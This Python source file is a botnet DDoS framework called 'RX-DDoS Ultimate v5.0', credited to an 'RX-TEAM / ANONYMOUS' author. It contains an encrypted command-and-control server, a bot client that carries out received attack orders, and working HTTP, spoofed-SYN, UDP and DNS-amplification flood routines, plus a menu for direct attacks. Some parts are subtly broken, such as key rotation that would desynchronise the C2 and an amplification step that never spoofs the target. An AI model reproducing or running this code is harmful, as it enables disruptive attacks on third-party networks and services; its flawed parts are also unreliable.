#!/usr/bin/env python3
"""
RX-DDoS Ultimate v5.0
Advanced Botnet DDoS Framework
Developed by: CRZ101
Team: RX-TEAM
Organization: ANONYMOUS
For Authorized Penetration Testing Only
"""

import socket
import threading
import random
import time
import struct
import ssl
import hashlib
import base64
import json
import os
import sys
import ipaddress
from urllib.parse import urlparse
import select
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
import dns.message
import dns.query
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Disable scapy warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    if sys.platform in ['linux', 'linux2', 'darwin']:
        from scapy.all import *
        from scapy.layers.http import HTTPRequest
        from scapy.layers.dns import DNS, DNSQR
        from scapy.layers.inet import IP, TCP, UDP, ICMP
        SCAPY_AVAILABLE = True
    else:
        SCAPY_AVAILABLE = False
except:
    SCAPY_AVAILABLE = False

class AdvancedEncryption:
    """Advanced encryption system for C2 communications"""
    
    def __init__(self, password=None):
        if password is None:
            password = "rx_team_advanced_botnet_v5"
        salt = b'rx_ddos_salt_2024'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self.fernet = Fernet(key)
        self.rotation_interval = 3600
        self.last_rotation = time.time()
    
    def encrypt(self, data):
        if time.time() - self.last_rotation > self.rotation_interval:
            self._rotate_keys()
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, encrypted_data):
        if time.time() - self.last_rotation > self.rotation_interval:
            self._rotate_keys()
        return self.fernet.decrypt(encrypted_data).decode()
    
    def _rotate_keys(self):
        # Key rotation for enhanced security
        new_password = hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(new_password.encode()))
        self.fernet = Fernet(key)
        self.last_rotation = time.time()

class BotnetC2Server:
    """Advanced Command and Control Server"""
    
    def __init__(self, host='0.0.0.0', ports=[501, 502, 503]):
        self.host = host
        self.ports = ports
        self.encryption = AdvancedEncryption()
        self.bots = {}
        self.command_queue = {}
        self.is_running = False
        
        # Attack configurations
        self.attack_configs = {
            'http_flood': {'active': False, 'target': None, 'threads': 0},
            'syn_flood': {'active': False, 'target': None, 'threads': 0},
            'udp_flood': {'active': False, 'target': None, 'threads': 0},
            'dns_amplification': {'active': False, 'target': None, 'threads': 0}
        }
    
    def start_server(self):
        """Start the C2 server on all configured ports"""
        print(f"[C2] Starting Advanced Botnet C2 Server on ports {self.ports}")
        self.is_running = True
        
        # Start listeners for each port
        for port in self.ports:
            threading.Thread(target=self._start_port_listener, args=(port,), daemon=True).start()
        
        # Start management threads
        threading.Thread(target=self._bot_heartbeat_monitor, daemon=True).start()
        threading.Thread(target=self._command_distributor, daemon=True).start()
        threading.Thread(target=self._attack_coordinator, daemon=True).start()
        
        print("[C2] C2 Server fully operational")
        return True
    
    def _start_port_listener(self, port):
        """Start listener on specific port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host, port))
            sock.listen(1000)
            sock.settimeout(1)
            
            print(f"[C2] Listening on port {port}")
            
            while self.is_running:
                try:
                    client_socket, client_address = sock.accept()
                    threading.Thread(
                        target=self._handle_bot_connection,
                        args=(client_socket, client_address, port),
                        daemon=True
                    ).start()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        print(f"[C2] Port {port} error: {e}")
        except Exception as e:
            print(f"[C2] Failed to start port {port}: {e}")
    
    def _handle_bot_connection(self, client_socket, client_address, port):
        """Handle incoming bot connections"""
        bot_id = hashlib.md5(f"{client_address[0]}:{client_address[1]}".encode()).hexdigest()[:12]
        
        try:
            # Register bot
            self.bots[bot_id] = {
                'socket': client_socket,
                'address': client_address,
                'port': port,
                'last_seen': time.time(),
                'status': 'connected',
                'capabilities': self._detect_bot_capabilities(client_socket)
            }
            
            print(f"[C2] New bot connected: {bot_id} from {client_address}")
            
            # Main bot communication loop
            while self.is_running and bot_id in self.bots:
                try:
                    # Check for commands for this bot
                    if bot_id in self.command_queue and self.command_queue[bot_id]:
                        command = self.command_queue[bot_id].pop(0)
                        encrypted_command = self.encryption.encrypt(json.dumps(command))
                        client_socket.send(encrypted_command + b'\n')
                    
                    # Receive bot status
                    client_socket.settimeout(1)
                    data = client_socket.recv(4096)
                    if data:
                        decrypted_data = self.encryption.decrypt(data.strip())
                        status_update = json.loads(decrypted_data)
                        self._process_bot_status(bot_id, status_update)
                    
                    self.bots[bot_id]['last_seen'] = time.time()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    break
                    
        except Exception as e:
            print(f"[C2] Bot {bot_id} connection error: {e}")
        finally:
            if bot_id in self.bots:
                self.bots[bot_id]['status'] = 'disconnected'
                print(f"[C2] Bot {bot_id} disconnected")
    
    def _detect_bot_capabilities(self, socket):
        """Detect bot capabilities"""
        capabilities = {
            'http_flood': True,
            'syn_flood': SCAPY_AVAILABLE,
            'udp_flood': True,
            'dns_amplification': True,
            'ssl_support': True
        }
        return capabilities
    
    def _process_bot_status(self, bot_id, status):
        """Process status updates from bots"""
        if 'attack_results' in status:
            print(f"[BOT] {bot_id} attack results: {status['attack_results']}")
    
    def _bot_heartbeat_monitor(self):
        """Monitor bot heartbeats and remove dead bots"""
        while self.is_running:
            current_time = time.time()
            dead_bots = []
            
            for bot_id, bot_info in self.bots.items():
                if current_time - bot_info['last_seen'] > 30:  # 30 seconds timeout
                    dead_bots.append(bot_id)
            
            for bot_id in dead_bots:
                del self.bots[bot_id]
                print(f"[C2] Removed dead bot: {bot_id}")
            
            time.sleep(10)
    
    def _command_distributor(self):
        """Distribute commands to bots"""
        while self.is_running:
            for bot_id in list(self.bots.keys()):
                # Ensure each bot has a command queue
                if bot_id not in self.command_queue:
                    self.command_queue[bot_id] = []
            
            time.sleep(1)
    
    def _attack_coordinator(self):
        """Coordinate attacks across all bots"""
        while self.is_running:
            active_attacks = [k for k, v in self.attack_configs.items() if v['active']]
            
            for attack_type in active_attacks:
                config = self.attack_configs[attack_type]
                if config['target'] and config['threads'] > 0:
                    self._distribute_attack(attack_type, config)
            
            time.sleep(5)
    
    def _distribute_attack(self, attack_type, config):
        """Distribute attack commands to available bots"""
        available_bots = [bid for bid, binfo in self.bots.items() 
                         if binfo['status'] == 'connected' 
                         and binfo['capabilities'].get(attack_type, False)]
        
        if not available_bots:
            return
        
        # Calculate threads per bot
        threads_per_bot = max(1, config['threads'] // len(available_bots))
        
        for bot_id in available_bots:
            attack_command = {
                'type': 'attack',
                'attack_type': attack_type,
                'target': config['target'],
                'threads': threads_per_bot,
                'duration': 300,
                'intensity': 'high'
            }
            
            if bot_id not in self.command_queue:
                self.command_queue[bot_id] = []
            
            self.command_queue[bot_id].append(attack_command)

class AdvancedAttackEngine:
    """Advanced DDoS Attack Engine"""
    
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
        ]
        
        # Open DNS resolvers for amplification
        self.dns_resolvers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
            '9.9.9.9', '149.112.112.112', '64.6.64.6', '64.6.65.6'
        ]
    
    def http_flood_attack(self, target, port=80, duration=60, threads=50):
        """Advanced HTTP Flood Attack"""
        print(f"[ATTACK] Starting HTTP Flood on {target}:{port}")
        
        end_time = time.time() + duration
        request_count = 0
        
        def http_worker(worker_id):
            nonlocal request_count
            local_count = 0
            
            while time.time() < end_time:
                try:
                    # Create socket connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    # Connect to target
                    sock.connect((target, port))
                    
                    # Craft HTTP request
                    path = random.choice(['/', '/index.html', '/api/v1/test', '/wp-admin', '/admin'])
                    headers = [
                        f"GET {path} HTTP/1.1",
                        f"Host: {target}",
                        f"User-Agent: {random.choice(self.user_agents)}",
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language: en-US,en;q=0.5",
                        "Accept-Encoding: gzip, deflate",
                        f"X-Forwarded-For: {self._generate_random_ip()}",
                        "Connection: keep-alive",
                        "\r\n"
                    ]
                    
                    request = "\r\n".join(headers)
                    sock.send(request.encode())
                    
                    # Try to receive response (but don't block)
                    try:
                        sock.settimeout(0.5)
                        response = sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                    local_count += 1
                    request_count += 1
                    
                except Exception as e:
                    pass
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(http_worker, i) for i in range(threads)]
            
            # Monitor progress
            while any(not f.done() for f in futures) and time.time() < end_time:
                time.sleep(1)
                print(f"[HTTP] Requests sent: {request_count} | Active threads: {threads}")
        
        print(f"[ATTACK] HTTP Flood completed - Total requests: {request_count}")
        return request_count
    
    def syn_flood_attack(self, target, port=80, duration=60, threads=50):
        """Advanced SYN Flood Attack"""
        if not SCAPY_AVAILABLE:
            print("[ERROR] Scapy not available for SYN flood")
            return 0
        
        print(f"[ATTACK] Starting SYN Flood on {target}:{port}")
        
        end_time = time.time() + duration
        packet_count = 0
        
        def syn_worker(worker_id):
            nonlocal packet_count
            local_count = 0
            
            while time.time() < end_time:
                try:
                    # Craft SYN packet with random source IP and port
                    src_ip = self._generate_random_ip()
                    src_port = random.randint(1024, 65535)
                    
                    ip_layer = IP(src=src_ip, dst=target)
                    tcp_layer = TCP(sport=src_port, dport=port, flags="S", seq=random.randint(0, 4294967295))
                    
                    # Send packet
                    send(ip_layer/tcp_layer, verbose=0)
                    
                    local_count += 1
                    packet_count += 1
                    
                except Exception as e:
                    pass
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(syn_worker, i) for i in range(threads)]
            
            # Monitor progress
            while any(not f.done() for f in futures) and time.time() < end_time:
                time.sleep(1)
                print(f"[SYN] Packets sent: {packet_count} | Active threads: {threads}")
        
        print(f"[ATTACK] SYN Flood completed - Total packets: {packet_count}")
        return packet_count
    
    def udp_flood_attack(self, target, port=53, duration=60, threads=50):
        """Advanced UDP Flood Attack"""
        print(f"[ATTACK] Starting UDP Flood on {target}:{port}")
        
        end_time = time.time() + duration
        packet_count = 0
        
        def udp_worker(worker_id):
            nonlocal packet_count
            local_count = 0
            
            while time.time() < end_time:
                try:
                    # Create UDP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Generate random payload
                    payload_size = random.randint(100, 1400)
                    payload = os.urandom(payload_size)
                    
                    # Send UDP packet
                    sock.sendto(payload, (target, port))
                    sock.close()
                    
                    local_count += 1
                    packet_count += 1
                    
                except Exception as e:
                    pass
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(udp_worker, i) for i in range(threads)]
            
            # Monitor progress
            while any(not f.done() for f in futures) and time.time() < end_time:
                time.sleep(1)
                print(f"[UDP] Packets sent: {packet_count} | Active threads: {threads}")
        
        print(f"[ATTACK] UDP Flood completed - Total packets: {packet_count}")
        return packet_count
    
    def dns_amplification_attack(self, target, duration=60, threads=30):
        """Advanced DNS Amplification Attack"""
        print(f"[ATTACK] Starting DNS Amplification on {target}")
        
        end_time = time.time() + duration
        query_count = 0
        
        def dns_worker(worker_id):
            nonlocal query_count
            local_count = 0
            
            while time.time() < end_time:
                try:
                    # Use open DNS resolver
                    dns_server = random.choice(self.dns_resolvers)
                    
                    # Create DNS query for amplification
                    query = dns.message.make_query('isc.org', 'ANY')
                    query_data = query.to_wire()
                    
                    # Send to DNS server spoofing source IP as target
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(query_data, (dns_server, 53))
                    sock.close()
                    
                    local_count += 1
                    query_count += 1
                    
                except Exception as e:
                    pass
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(dns_worker, i) for i in range(threads)]
            
            # Monitor progress
            while any(not f.done() for f in futures) and time.time() < end_time:
                time.sleep(1)
                print(f"[DNS] Queries sent: {query_count} | Active threads: {threads}")
        
        print(f"[ATTACK] DNS Amplification completed - Total queries: {query_count}")
        return query_count
    
    def _generate_random_ip(self):
        """Generate random IP address for spoofing"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

class BotClient:
    """Advanced Bot Client"""
    
    def __init__(self, c2_host, c2_port=501):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.encryption = AdvancedEncryption()
        self.attack_engine = AdvancedAttackEngine()
        self.bot_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:12]
        self.is_running = True
    
    def connect_to_c2(self):
        """Connect to C2 server and receive commands"""
        print(f"[BOT] {self.bot_id} connecting to C2 at {self.c2_host}:{self.c2_port}")
        
        while self.is_running:
            try:
                # Connect to C2 server
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.c2_host, self.c2_port))
                
                print(f"[BOT] {self.bot_id} connected to C2")
                
                # Main command loop
                while self.is_running:
                    try:
                        # Receive command from C2
                        sock.settimeout(1)
                        data = sock.recv(4096)
                        
                        if data:
                            command_str = self.encryption.decrypt(data.strip())
                            command = json.loads(command_str)
                            self._execute_command(command, sock)
                        
                        # Send heartbeat
                        status = {
                            'bot_id': self.bot_id,
                            'status': 'active',
                            'timestamp': time.time()
                        }
                        encrypted_status = self.encryption.encrypt(json.dumps(status))
                        sock.send(encrypted_status + b'\n')
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                
                sock.close()
                
            except Exception as e:
                print(f"[BOT] Connection error: {e}")
                time.sleep(5)  # Wait before reconnecting
    
    def _execute_command(self, command, sock):
        """Execute received command"""
        try:
            if command.get('type') == 'attack':
                self._execute_attack(command, sock)
            elif command.get('type') == 'info':
                self._send_system_info(sock)
        except Exception as e:
            print(f"[BOT] Command execution error: {e}")
    
    def _execute_attack(self, command, sock):
        """Execute attack command"""
        attack_type = command.get('attack_type')
        target = command.get('target')
        threads = command.get('threads', 10)
        duration = command.get('duration', 60)
        
        print(f"[BOT] Executing {attack_type} attack on {target}")
        
        try:
            if attack_type == 'http_flood':
                result = self.attack_engine.http_flood_attack(target, 80, duration, threads)
            elif attack_type == 'syn_flood':
                result = self.attack_engine.syn_flood_attack(target, 80, duration, threads)
            elif attack_type == 'udp_flood':
                result = self.attack_engine.udp_flood_attack(target, 53, duration, threads)
            elif attack_type == 'dns_amplification':
                result = self.attack_engine.dns_amplification_attack(target, duration, threads)
            else:
                result = 0
            
            # Send attack results
            attack_report = {
                'bot_id': self.bot_id,
                'attack_type': attack_type,
                'target': target,
                'result': result,
                'timestamp': time.time()
            }
            
            encrypted_report = self.encryption.encrypt(json.dumps(attack_report))
            sock.send(encrypted_report + b'\n')
            
        except Exception as e:
            print(f"[BOT] Attack execution error: {e}")
    
    def _send_system_info(self, sock):
        """Send system information to C2"""
        system_info = {
            'bot_id': self.bot_id,
            'platform': sys.platform,
            'python_version': sys.version,
            'capabilities': {
                'http_flood': True,
                'syn_flood': SCAPY_AVAILABLE,
                'udp_flood': True,
                'dns_amplification': True
            }
        }
        
        encrypted_info = self.encryption.encrypt(json.dumps(system_info))
        sock.send(encrypted_info + b'\n')

class RXDDosUltimate:
    """Main RX-DDoS Ultimate Class"""
    
    def __init__(self):
        self.c2_server = None
        self.attack_engine = AdvancedAttackEngine()
        self.stats = {
            'total_attacks': 0,
            'total_requests': 0,
            'active_bots': 0,
            'start_time': time.time()
        }
    
    def print_banner(self):
        """Print advanced banner"""
        banner = r"""
██████╗ ██╗  ██╗    ██████╗ ██████╗ ██████╗ ███████╗
██╔══██╗╚██╗██╔╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
██████╔╝ ╚███╔╝     ██║  ██║██║  ██║██║  ██║███████╗
██╔══██╗ ██╔██╗     ██║  ██║██║  ██║██║  ██║╚════██║
██║  ██║██╔╝ ██╗    ██████╔╝██████╔╝██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                     
Ultimate DDoS Framework v5.0
Developed by CRZ101 | RX-TEAM | ANONYMOUS
        """
        print(banner)
    
    def start_c2_server(self):
        """Start the C2 server"""
        print("[MAIN] Starting Advanced C2 Server...")
        self.c2_server = BotnetC2Server()
        if self.c2_server.start_server():
            print("[MAIN] C2 Server started successfully on ports 501, 502, 503")
            return True
        return False
    
    def start_bot_client(self, c2_host='127.0.0.1'):
        """Start a bot client"""
        print(f"[MAIN] Starting Bot Client connecting to {c2_host}")
        bot = BotClient(c2_host)
        bot.connect_to_c2()
    
    def direct_attack(self):
        """Launch direct attack without botnet"""
        print("\n[ATTACK] Direct Attack Mode")
        
        target = input("Enter target IP/hostname: ").strip()
        if not target:
            print("[-] Invalid target")
            return
        
        print("\nAvailable attack types:")
        print("1. HTTP Flood")
        print("2. SYN Flood")
        print("3. UDP Flood") 
        print("4. DNS Amplification")
        
        choice = input("Select attack type (1-4): ").strip()
        
        try:
            threads = int(input("Number of threads (100): ") or "100")
            duration = int(input("Duration in seconds (60): ") or "60")
        except:
            threads = 100
            duration = 60
        
        if choice == "1":
            self.attack_engine.http_flood_attack(target, 80, duration, threads)
        elif choice == "2":
            self.attack_engine.syn_flood_attack(target, 80, duration, threads)
        elif choice == "3":
            self.attack_engine.udp_flood_attack(target, 53, duration, threads)
        elif choice == "4":
            self.attack_engine.dns_amplification_attack(target, duration, threads)
        else:
            print("[-] Invalid attack type")
    
    def show_stats(self):
        """Show current statistics"""
        current_time = time.time()
        uptime = current_time - self.stats['start_time']
        
        print(f"\n[STATS] System Uptime: {uptime:.1f}s")
        print(f"[STATS] Total Attacks: {self.stats['total_attacks']}")
        print(f"[STATS] Total Requests: {self.stats['total_requests']}")
        
        if self.c2_server:
            active_bots = len([b for b in self.c2_server.bots.values() if b['status'] == 'connected'])
            print(f"[STATS] Active Bots: {active_bots}")
    
    def main_menu(self):
        """Main menu interface"""
        self.print_banner()
        
        while True:
            print("\n" + "="*50)
            print("RX-DDoS Ultimate v5.0 - Main Menu")
            print("="*50)
            print("1. Start C2 Server (Ports 501,502,503)")
            print("2. Start Bot Client")
            print("3. Direct Attack")
            print("4. Show Statistics")
            print("5. Advanced Botnet Attack")
            print("6. Exit")
            print("="*50)
            
            choice = input("\nSelect option (1-6): ").strip()
            
            if choice == "1":
                self.start_c2_server()
                input("\nPress Enter to return to menu...")
            elif choice == "2":
                c2_host = input("Enter C2 server IP [127.0.0.1]: ").strip() or "127.0.0.1"
                self.start_bot_client(c2_host)
            elif choice == "3":
                self.direct_attack()
            elif choice == "4":
                self.show_stats()
            elif choice == "5":
                print("\n[INFO] Advanced botnet attacks are coordinated through the C2 server")
                print("Start C2 server first, then connect multiple bot clients")
            elif choice == "6":
                print("\n[MAIN] Shutting down RX-DDoS Ultimate...")
                if self.c2_server:
                    self.c2_server.is_running = False
                break
            else:
                print("[-] Invalid option")

def main():
    """Main entry point"""
    try:
        # Check for root privileges on Unix systems
        if os.name != 'nt' and os.geteuid() != 0:
            print("[WARNING] Running without root privileges may limit some attacks")
        
        app = RXDDosUltimate()
        app.main_menu()
        
    except KeyboardInterrupt:
        print("\n[MAIN] Program interrupted by user")
    except Exception as e:
        print(f"[ERROR] Fatal error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()